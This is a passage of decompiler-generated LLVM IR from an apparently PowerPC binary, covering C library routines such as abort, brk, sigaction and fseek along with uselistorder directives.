  %v0_1000d568 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000d568 = icmp eq i32 %v0_1000d568, 0
  store i32 %v0_1000d564, i32* @r31, align 4
  br i1 %v3_1000d568, label %dec_label_pc_1000d5a4, label %dec_label_pc_1000d578

dec_label_pc_1000d578:                            ; preds = %dec_label_pc_1000d548
  %v1_1000d570 = icmp slt i32 %v0_1000d564, 0
  %v1_1000d578 = add i32 %v0_1000d568, 4
  store i32 %v1_1000d578, i32* @r3, align 4
  %v2_1000d57c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000d57c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000d570, label %dec_label_pc_1000d5a4, label %dec_label_pc_1000d588

dec_label_pc_1000d588:                            ; preds = %dec_label_pc_1000d578
  %v3_1000d588 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000d588, i32* %r0.global-to-local, align 4
  %v2_1000d58c = inttoptr i32 %v0_1000d568 to i32*
  store i32 %v3_1000d588, i32* %v2_1000d58c, align 4
  store i32 268490132, i32* @lr, align 4
  %v0_1000d590 = call i32 @memcpy()
  %v1_1000d59c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d59c = add i32 %v1_1000d59c, 136
  %v3_1000d59c = inttoptr i32 %v2_1000d59c to i32*
  %v0_1000d5a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d5a0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d5a0 = add i32 %v1_1000d5a0, 132
  %v3_1000d5a0 = inttoptr i32 %v2_1000d5a0 to i32*
  store i32 %v0_1000d5a0, i32* %v3_1000d5a0, align 4
  %v0_1000d5a8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d5a4

dec_label_pc_1000d5a4:                            ; preds = %dec_label_pc_1000d578, %dec_label_pc_1000d548, %dec_label_pc_1000d588
  %v0_1000d5a8 = phi i32 [ %v0_1000d564, %dec_label_pc_1000d578 ], [ %v0_1000d564, %dec_label_pc_1000d548 ], [ %v0_1000d5a8.pre, %dec_label_pc_1000d588 ]
  store i32 %v0_1000d4fc, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d5a8

; uselistorder directives
  uselistorder i32 %v0_1000d564, { 0, 1, 3, 2 }
  uselistorder i32 ()* @memcpy, { 4, 3, 2, 9, 8, 0, 1, 7, 6, 5, 10 }
  uselistorder i32 128, { 16, 17, 1, 2, 3, 6, 7, 8, 9, 10, 4, 11, 12, 13, 0, 5, 14, 15 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1000d5a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d548, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d5f0.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_1000d5d4 = call i32 @__pthread_return_0()
  %v2_1000d5dc = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000d5dc, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000d5f433 = add i32 %v2_1000d5dc, 124
  %v4_1000d5f434 = inttoptr i32 %v3_1000d5f433 to i32*
  store i32 0, i32* %v4_1000d5f434, align 4
  %v0_1000d5f835 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d5f836 = add i32 %v0_1000d5f835, -1
  store i32 %v1_1000d5f836, i32* %r9.global-to-local, align 4
  %v0_1000d5fc37 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d5fc38 = add i32 %v0_1000d5fc37, -1
  store i32 %v1_1000d5fc38, i32* %ctr.global-to-local, align 4
  %v2_1000d5fc39 = icmp eq i32 %v1_1000d5fc38, 0
  br i1 %v2_1000d5fc39, label %dec_label_pc_1000d600, label %dec_label_pc_1000d5f0.dec_label_pc_1000d5f0_crit_edge

dec_label_pc_1000d5f0.dec_label_pc_1000d5f0_crit_edge: ; preds = %dec_label_pc_1000d5f0.lr.ph, %dec_label_pc_1000d5f0.dec_label_pc_1000d5f0_crit_edge
  %v1_1000d5f840 = phi i32 [ %v1_1000d5f8, %dec_label_pc_1000d5f0.dec_label_pc_1000d5f0_crit_edge ], [ %v1_1000d5f836, %dec_label_pc_1000d5f0.lr.ph ]
  %v0_1000d5f4.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d5f4.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1000d5f0 = mul i32 %v1_1000d5f840, 4
  %v3_1000d5f4 = add i32 %v1_1000d5f0, %v1_1000d5f4.pre
  %v4_1000d5f4 = inttoptr i32 %v3_1000d5f4 to i32*
  store i32 %v0_1000d5f4.pre, i32* %v4_1000d5f4, align 4
  %v0_1000d5f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d5f8 = add i32 %v0_1000d5f8, -1
  store i32 %v1_1000d5f8, i32* %r9.global-to-local, align 4
  %v0_1000d5fc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d5fc = add i32 %v0_1000d5fc, -1
  store i32 %v1_1000d5fc, i32* %ctr.global-to-local, align 4
  %v2_1000d5fc = icmp eq i32 %v1_1000d5fc, 0
  br i1 %v2_1000d5fc, label %dec_label_pc_1000d600, label %dec_label_pc_1000d5f0.dec_label_pc_1000d5f0_crit_edge

dec_label_pc_1000d600:                            ; preds = %dec_label_pc_1000d5f0.dec_label_pc_1000d5f0_crit_edge, %dec_label_pc_1000d5f0.lr.ph
  store i32 %v2_1000d5dc, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_1000d608 = call i32 @__sigaddset()
  %v3_1000d60c = icmp eq i32 %v0_1000d608, 0
  br i1 %v3_1000d60c, label %dec_label_pc_1000d614, label %dec_label_pc_1000d624

dec_label_pc_1000d614:                            ; preds = %dec_label_pc_1000d600
  store i32 268490276, i32* @lr, align 4
  %v3_1000d620 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_1000d5dc, i32 0)
  br label %dec_label_pc_1000d624

dec_label_pc_1000d624:                            ; preds = %dec_label_pc_1000d600, %dec_label_pc_1000d614
  store i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000d628 = load i32, i32* @global_var_1001fdf4.245, align 4
  %v3_1000d62c = icmp eq i32 %v3_1000d628, 0
  br i1 %v3_1000d62c, label %dec_label_pc_1000d634, label %dec_label_pc_1000d65c

dec_label_pc_1000d634:                            ; preds = %dec_label_pc_1000d624
  store i32 1, i32* @global_var_1001fdf4.245, align 4
  br label %dec_label_pc_1000d63c

dec_label_pc_1000d63c:                            ; preds = %dec_label_pc_1000d6b8, %dec_label_pc_1000d634
  store i32 ptrtoint (i32* @global_var_1001fd34.243 to i32), i32* %r29.global-to-local, align 4
  %v0_1000d648 = call i32 @__pthread_return_0()
  store i32 268490324, i32* @lr, align 4
  %v1_1000d650 = call i32 @__raise(i32 6)
  %v0_1000d658 = call i32 @__pthread_return_0()
  %v3_1000d660.pre = load i32, i32* @global_var_1001fdf4.245, align 4
  br label %dec_label_pc_1000d65c

dec_label_pc_1000d65c:                            ; preds = %dec_label_pc_1000d624, %dec_label_pc_1000d63c
  %v0_1000d6d4 = phi i32 [ %v3_1000d628, %dec_label_pc_1000d624 ], [ %v3_1000d660.pre, %dec_label_pc_1000d63c ]
  store i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000d664 = icmp eq i32 %v0_1000d6d4, 1
  br i1 %v3_1000d664, label %dec_label_pc_1000d6a4.lr.ph, label %dec_label_pc_1000d6d4

dec_label_pc_1000d6a4.lr.ph:                      ; preds = %dec_label_pc_1000d65c
  %v2_1000d670 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1001fdf4.245, align 4
  store i32 ptrtoint (i32* @global_var_1000d684.247 to i32), i32* @lr, align 4
  %v3_1000d680 = call i32 @__GI_memset(i32 %v2_1000d670, i32 0, i32 140)
  store i32 %v2_1000d5dc, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_1000d5f433, i32* %r9.global-to-local, align 4
  %v2_1000d6ac25 = add i32 %v2_1000d5dc, 256
  %v3_1000d6ac26 = inttoptr i32 %v2_1000d6ac25 to i32*
  store i32 -1, i32* %v3_1000d6ac26, align 4
  %v0_1000d6b027 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d6b028 = add i32 %v0_1000d6b027, -1
  store i32 %v1_1000d6b028, i32* %r11.global-to-local, align 4
  %v0_1000d6b429 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d6b430 = add i32 %v0_1000d6b429, -1
  store i32 %v1_1000d6b430, i32* %ctr.global-to-local, align 4
  %v2_1000d6b431 = icmp eq i32 %v1_1000d6b430, 0
  br i1 %v2_1000d6b431, label %dec_label_pc_1000d6b8, label %dec_label_pc_1000d6a4.dec_label_pc_1000d6a4_crit_edge

dec_label_pc_1000d6a4.dec_label_pc_1000d6a4_crit_edge: ; preds = %dec_label_pc_1000d6a4.lr.ph, %dec_label_pc_1000d6a4.dec_label_pc_1000d6a4_crit_edge
  %v1_1000d6b032 = phi i32 [ %v1_1000d6b0, %dec_label_pc_1000d6a4.dec_label_pc_1000d6a4_crit_edge ], [ %v1_1000d6b028, %dec_label_pc_1000d6a4.lr.ph ]
  %v1_1000d6a8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000d6ac.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d6a4 = mul i32 %v1_1000d6b032, 4
  %v2_1000d6a8 = add i32 %v1_1000d6a4, %v1_1000d6a8.pre
  store i32 %v2_1000d6a8, i32* %r9.global-to-local, align 4
  %v2_1000d6ac = add i32 %v2_1000d6a8, 132
  %v3_1000d6ac = inttoptr i32 %v2_1000d6ac to i32*
  store i32 %v0_1000d6ac.pre, i32* %v3_1000d6ac, align 4
  %v0_1000d6b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d6b0 = add i32 %v0_1000d6b0, -1
  store i32 %v1_1000d6b0, i32* %r11.global-to-local, align 4
  %v0_1000d6b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d6b4 = add i32 %v0_1000d6b4, -1
  store i32 %v1_1000d6b4, i32* %ctr.global-to-local, align 4
  %v2_1000d6b4 = icmp eq i32 %v1_1000d6b4, 0
  br i1 %v2_1000d6b4, label %dec_label_pc_1000d6b8, label %dec_label_pc_1000d6a4.dec_label_pc_1000d6a4_crit_edge

dec_label_pc_1000d6b8:                            ; preds = %dec_label_pc_1000d6a4.dec_label_pc_1000d6a4_crit_edge, %dec_label_pc_1000d6a4.lr.ph
  store i32 268490448, i32* @lr, align 4
  %v4_1000d6cc = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000d63c

dec_label_pc_1000d6d4:                            ; preds = %dec_label_pc_1000d65c
  %v3_1000d6d4 = icmp eq i32 %v0_1000d6d4, 2
  br i1 %v3_1000d6d4, label %dec_label_pc_1000d6dc, label %dec_label_pc_1000d6e8

dec_label_pc_1000d6dc:                            ; preds = %dec_label_pc_1000d6d4
  store i32 3, i32* @global_var_1001fdf4.245, align 4
  br label %dec_label_pc_1000d6e8

dec_label_pc_1000d6e8:                            ; preds = %dec_label_pc_1000d6d4, %dec_label_pc_1000d6dc
  %v3_1000d6e8 = phi i32 [ %v0_1000d6d4, %dec_label_pc_1000d6d4 ], [ 3, %dec_label_pc_1000d6dc ]
  %v1_1000d6f0 = icmp ne i32 %v3_1000d6e8, 3
  call void @__pseudo_cond_branch(i1 %v1_1000d6f0, i32 268490500)
  store i32 4, i32* @global_var_1001fdf4.245, align 4
  %v1_1000d700 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_1000d700

; uselistorder directives
  uselistorder i32 %v1_1000d6b4, { 1, 0 }
  uselistorder i32 %v1_1000d6b0, { 1, 0 }
  uselistorder i32 %v1_1000d5fc, { 1, 0 }
  uselistorder i32 %v1_1000d5f8, { 1, 0 }
  uselistorder i32 %v2_1000d5dc, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 2, 5, 6, 8, 7, 3, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 127, { 1, 4, 0, 3, 5, 2 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 2, 24, 1, 6, 0, 23, 22, 21, 20, 5, 19, 18, 17, 16, 15, 14, 12, 13, 11, 10, 9, 8, 7, 4, 3 }
  uselistorder i32* @global_var_1001fdf4.245, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_10020000.2 to i32), { 13, 14, 1, 15, 3, 2, 6, 4, 7, 8, 16, 17, 18, 19, 0, 9, 10, 11, 5, 12 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder i32* @r4, { 79, 76, 77, 73, 74, 62, 8, 9, 10, 11, 12, 13, 14, 15, 89, 2, 3, 16, 17, 81, 44, 45, 7, 71, 72, 78, 18, 4, 75, 82, 83, 84, 19, 20, 21, 5, 22, 23, 24, 25, 26, 27, 28, 1, 88, 29, 30, 31, 32, 33, 0, 34, 35, 6, 36, 80, 85, 86, 87, 37, 38, 39, 40, 41, 42, 43, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70 }
  uselistorder i32 6, { 6, 7, 19, 0, 14, 15, 3, 1, 16, 8, 17, 2, 9, 10, 11, 12, 4, 5, 13, 18 }
  uselistorder i32 32, { 20, 21, 59, 40, 29, 28, 41, 42, 17, 18, 52, 53, 39, 2, 3, 4, 19, 43, 44, 30, 45, 46, 47, 48, 49, 50, 51, 0, 60, 61, 54, 55, 6, 5, 32, 8, 7, 31, 10, 9, 33, 1, 24, 56, 57, 58, 25, 34, 35, 12, 11, 14, 22, 13, 36, 37, 16, 23, 15, 38, 26, 27 }
  uselistorder label %dec_label_pc_1000d6e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d6a4.dec_label_pc_1000d6a4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d65c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d624, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5f0.dec_label_pc_1000d5f0_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000d70c = add i32 %arg1, 28
  %v2_1000d70c = inttoptr i32 %v1_1000d70c to i32*
  %v3_1000d70c = load i32, i32* %v2_1000d70c, align 4
  store i32 %v3_1000d70c, i32* @global_var_1001fdf8.248, align 4
  %v1_1000d71c = add i32 %arg1, 44
  %v2_1000d71c = inttoptr i32 %v1_1000d71c to i32*
  %v3_1000d71c = load i32, i32* %v2_1000d71c, align 4
  store i32 %v3_1000d71c, i32* @global_var_1001fdfc.249, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1001fe00.236, align 4
  %v0_1000d750 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000d750)
  store i32 12, i32* @r3, align 4
  %v0_1000d758 = call i32 @__syscall_error()
  ret i32 %v0_1000d758

; uselistorder directives
  uselistorder i32 ()* @__syscall_error, { 1, 0 }
  uselistorder i32 12, { 38, 13, 14, 15, 16, 17, 18, 19, 20, 4, 5, 21, 22, 23, 44, 11, 31, 37, 12, 39, 40, 41, 42, 3, 43, 0, 1, 2, 8, 45, 24, 25, 26, 27, 28, 29, 30, 6, 7, 9, 10, 32, 33, 34, 35, 36 }
  uselistorder i1 true, { 3, 4, 0, 1, 2 }
  uselistorder i32* @global_var_1001fe00.236, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d774 = call i32 @__asm_mfcr()
  %v1_1000d778 = and i32 %v0_1000d774, 268435456
  %v3_1000d778 = icmp eq i32 %v1_1000d778, 0
  store i32 %v0_1000d774, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d778, label %dec_label_pc_1000d790, label %dec_label_pc_1000d784

dec_label_pc_1000d784:                            ; preds = %entry
  %v0_1000d784 = call i32 @__errno_location()
  %v0_1000d788 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d788 = inttoptr i32 %v0_1000d784 to i32*
  store i32 %v0_1000d788, i32* %v2_1000d788, align 4
  br label %dec_label_pc_1000d790

dec_label_pc_1000d790:                            ; preds = %entry, %dec_label_pc_1000d784
  %v0_1000d7a0 = phi i32 [ %v0_1000d774, %entry ], [ -1, %dec_label_pc_1000d784 ]
  ret i32 %v0_1000d7a0

; uselistorder directives
  uselistorder label %dec_label_pc_1000d790, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000d7a4 = load i32, i32* @r5, align 4
  store i32 %v0_1000d7a4, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_1000d7ac = zext i1 %tmp to i32
  %v2_1000d7ac = ashr i32 %arg1, 31
  %v3_1000d7ac = and i32 %v2_1000d7ac, -2
  %v4_1000d7ac = or i32 %v3_1000d7ac, %v1_1000d7ac
  %v3_1000d7b0 = inttoptr i32 %v4_1000d7ac to i16*
  %v4_1000d7b0 = call i32 @__GI_fseeko64(i16* %v3_1000d7b0, i32 %arg1, i32 %v0_1000d7a4)
  ret i32 %v4_1000d7b0

; uselistorder directives
  uselistorder i32* @r5, { 6, 33, 34, 31, 2, 7, 8, 9, 10, 11, 12, 35, 13, 14, 15, 16, 17, 18, 48, 29, 30, 3, 40, 41, 42, 32, 19, 20, 21, 49, 50, 51, 52, 43, 44, 1, 45, 46, 47, 22, 23, 25, 24, 26, 0, 27, 28, 36, 37, 5, 38, 39, 4 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000d7b4 = load i32, i32* @r7, align 4
  %v0_1000d7b8 = load i32, i32* @lr, align 4
  store i32 %v0_1000d7b8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d7b4, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_1000d7b4, 3
  br i1 %tmp9, label %dec_label_pc_1000d7f0, label %dec_label_pc_1000d7dc

dec_label_pc_1000d7dc:                            ; preds = %entry
  %v0_1000d7dc = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000d7e8 = inttoptr i32 %v0_1000d7dc to i32*
  store i32 22, i32* %v2_1000d7e8, align 4
  br label %dec_label_pc_1000d8b8

dec_label_pc_1000d7f0:                            ; preds = %entry
  %v2_1000d7f0 = add i32 %tmp, 52
  %v3_1000d7f0 = inttoptr i32 %v2_1000d7f0 to i32*
  %v4_1000d7f0 = load i32, i32* %v3_1000d7f0, align 4
  store i32 %v4_1000d7f0, i32* @r28, align 4
  %v3_1000d7f4 = icmp eq i32 %v4_1000d7f0, 0
  br i1 %v3_1000d7f4, label %dec_label_pc_1000d7fc, label %dec_label_pc_1000d81c

dec_label_pc_1000d7fc:                            ; preds = %dec_label_pc_1000d7f0
  %v2_1000d7fc = add i32 %tmp, 56
  store i32 %v2_1000d7fc, i32* @r29, align 4
  %v2_1000d804 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000d804, i32* @r3, align 4
  %v0_1000d810 = call i32 @__pthread_return_void()
  %v0_1000d818 = call i32 @__pthread_return_0()
  %v0_1000d81c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d81c

dec_label_pc_1000d81c:                            ; preds = %dec_label_pc_1000d7f0, %dec_label_pc_1000d7fc
  %v0_1000d828 = phi i32 [ %tmp, %dec_label_pc_1000d7f0 ], [ %v0_1000d81c.pre, %dec_label_pc_1000d7fc ]
  %v1_1000d81c = inttoptr i32 %v0_1000d828 to i16*
  %v2_1000d81c = load i16, i16* %v1_1000d81c, align 2
  %v3_1000d81c = zext i16 %v2_1000d81c to i32
  store i32 %v3_1000d81c, i32* %r0.global-to-local, align 4
  %v1_1000d820 = and i32 %v3_1000d81c, 64
  store i32 %v1_1000d820, i32* %r9.global-to-local, align 4
  %v3_1000d820 = icmp eq i32 %v1_1000d820, 0
  br i1 %v3_1000d820, label %dec_label_pc_1000d838, label %dec_label_pc_1000d828

dec_label_pc_1000d828:                            ; preds = %dec_label_pc_1000d81c
  store i32 268490800, i32* @lr, align 4
  %v2_1000d82c = call i32 @__stdio_wcommit(i32 %v0_1000d828)
  %v3_1000d830 = icmp eq i32 %v2_1000d82c, 0
  br i1 %v3_1000d830, label %dec_label_pc_1000d838, label %dec_label_pc_1000d8a0

dec_label_pc_1000d838:                            ; preds = %dec_label_pc_1000d828, %dec_label_pc_1000d81c
  %v0_1000d838 = load i32, i32* @r30, align 4
  %v3_1000d838 = icmp eq i32 %v0_1000d838, 1
  br i1 %v3_1000d838, label %dec_label_pc_1000d840, label %dec_label_pc_1000d838.dec_label_pc_1000d854_crit_edge

dec_label_pc_1000d838.dec_label_pc_1000d854_crit_edge: ; preds = %dec_label_pc_1000d838
  br label %dec_label_pc_1000d854

dec_label_pc_1000d840:                            ; preds = %dec_label_pc_1000d838
  %v0_1000d840 = load i32, i32* @r31, align 4
  %v1_1000d840 = inttoptr i32 %v0_1000d840 to i16*
  %v2_1000d844 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268490828, i32* @lr, align 4
  %v4_1000d848 = call i32 @__stdio_adjust_position(i16* %v1_1000d840, i32 %v2_1000d844)
  %v1_1000d84c = icmp slt i32 %v4_1000d848, 0
  br i1 %v1_1000d84c, label %dec_label_pc_1000d8a0, label %dec_label_pc_1000d840.dec_label_pc_1000d854_crit_edge

dec_label_pc_1000d840.dec_label_pc_1000d854_crit_edge: ; preds = %dec_label_pc_1000d840
  %v0_1000d854.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d854

dec_label_pc_1000d854:                            ; preds = %dec_label_pc_1000d838.dec_label_pc_1000d854_crit_edge, %dec_label_pc_1000d840.dec_label_pc_1000d854_crit_edge
  %v0_1000d854 = phi i32 [ %v0_1000d838, %dec_label_pc_1000d838.dec_label_pc_1000d854_crit_edge ], [ %v0_1000d854.pre, %dec_label_pc_1000d840.dec_label_pc_1000d854_crit_edge ]
  %v0_1000d858 = load i32, i32* @r31, align 4
  store i32 268490852, i32* @lr, align 4
  %v5_1000d860 = call i32 @__stdio_seek(i32 %v0_1000d858, i32* nonnull %stack_var_-56, i32 %v0_1000d854)
  %v1_1000d864 = icmp slt i32 %v5_1000d860, 0
  br i1 %v1_1000d864, label %dec_label_pc_1000d8a0, label %dec_label_pc_1000d86c

dec_label_pc_1000d86c:                            ; preds = %dec_label_pc_1000d854
  %v0_1000d86c = load i32, i32* @r31, align 4
  %v1_1000d86c = inttoptr i32 %v0_1000d86c to i16*
  %v2_1000d86c = load i16, i16* %v1_1000d86c, align 2
  %v3_1000d86c = zext i16 %v2_1000d86c to i32
  store i32 %v3_1000d86c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000d874 = add i32 %v0_1000d86c, 8
  %v2_1000d874 = inttoptr i32 %v1_1000d874 to i32*
  %v3_1000d874 = load i32, i32* %v2_1000d874, align 4
  store i32 %v3_1000d874, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000d87c = and i32 %v3_1000d86c, 65464
  store i32 %v1_1000d87c, i32* %r0.global-to-local, align 4
  %v3_1000d880 = add i32 %v0_1000d86c, 2
  %v4_1000d880 = inttoptr i32 %v3_1000d880 to i8*
  store i8 0, i8* %v4_1000d880, align 1
  %v0_1000d884 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d884 = load i32, i32* @r31, align 4
  %v2_1000d884 = add i32 %v1_1000d884, 28
  %v3_1000d884 = inttoptr i32 %v2_1000d884 to i32*
  store i32 %v0_1000d884, i32* %v3_1000d884, align 4
  %v0_1000d888 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d888 = trunc i32 %v0_1000d888 to i16
  %v2_1000d888 = load i32, i32* @r31, align 4
  %v3_1000d888 = inttoptr i32 %v2_1000d888 to i16*
  store i16 %v1_1000d888, i16* %v3_1000d888, align 2
  %v0_1000d88c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d88c = load i32, i32* @r31, align 4
  %v2_1000d88c = add i32 %v1_1000d88c, 16
  %v3_1000d88c = inttoptr i32 %v2_1000d88c to i32*
  store i32 %v0_1000d88c, i32* %v3_1000d88c, align 4
  %v0_1000d890 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d890 = load i32, i32* @r31, align 4
  %v2_1000d890 = add i32 %v1_1000d890, 20
  %v3_1000d890 = inttoptr i32 %v2_1000d890 to i32*
  store i32 %v0_1000d890, i32* %v3_1000d890, align 4
  %v0_1000d894 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d894 = load i32, i32* @r31, align 4
  %v2_1000d894 = add i32 %v1_1000d894, 24
  %v3_1000d894 = inttoptr i32 %v2_1000d894 to i32*
  store i32 %v0_1000d894, i32* %v3_1000d894, align 4
  %v0_1000d898 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d898 = load i32, i32* @r31, align 4
  %v2_1000d898 = add i32 %v1_1000d898, 44
  %v3_1000d898 = inttoptr i32 %v2_1000d898 to i32*
  store i32 %v0_1000d898, i32* %v3_1000d898, align 4
  br label %dec_label_pc_1000d8a4

dec_label_pc_1000d8a0:                            ; preds = %dec_label_pc_1000d828, %dec_label_pc_1000d854, %dec_label_pc_1000d840
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1000d8a4

dec_label_pc_1000d8a4:                            ; preds = %dec_label_pc_1000d86c, %dec_label_pc_1000d8a0
  %v0_1000d8a4 = load i32, i32* @r28, align 4
  %v3_1000d8a4 = icmp eq i32 %v0_1000d8a4, 0
  br i1 %v3_1000d8a4, label %dec_label_pc_1000d8ac, label %dec_label_pc_1000d8b8

dec_label_pc_1000d8ac:                            ; preds = %dec_label_pc_1000d8a4
  %v2_1000d8ac = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000d8ac, i32* @r3, align 4
  %v0_1000d8b4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000d8b8

dec_label_pc_1000d8b8:                            ; preds = %dec_label_pc_1000d8a4, %dec_label_pc_1000d7dc, %dec_label_pc_1000d8ac
  store i32 %v0_1000d7b8, i32* %r0.global-to-local, align 4
  %v0_1000d8bc = load i32, i32* @r30, align 4
  ret i32 %v0_1000d8bc

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 24, { 7, 8, 5, 30, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 31, 32, 21, 22, 23, 24, 1, 2, 3, 4, 25, 26, 27, 28, 29, 0 }
  uselistorder i32 28, { 3, 22, 4, 16, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 0, 15, 23, 17, 18, 19, 1, 2, 20, 21 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_0, { 22, 5, 4, 3, 1, 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 21, 2, 20 }
  uselistorder i32 ()* @__pthread_return_void, { 14, 13, 2, 1, 3, 0, 8, 7, 6, 15, 5, 4, 12, 11, 10, 9 }
  uselistorder i32 56, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32* @r28, { 9, 10, 45, 46, 11, 1, 12, 13, 14, 15, 16, 2, 47, 48, 49, 3, 56, 50, 51, 52, 53, 54, 17, 18, 19, 20, 21, 4, 22, 23, 5, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0, 40, 41, 6, 7, 8, 42, 43, 55, 44 }
  uselistorder i32 52, { 0, 1, 5, 2, 4, 3 }
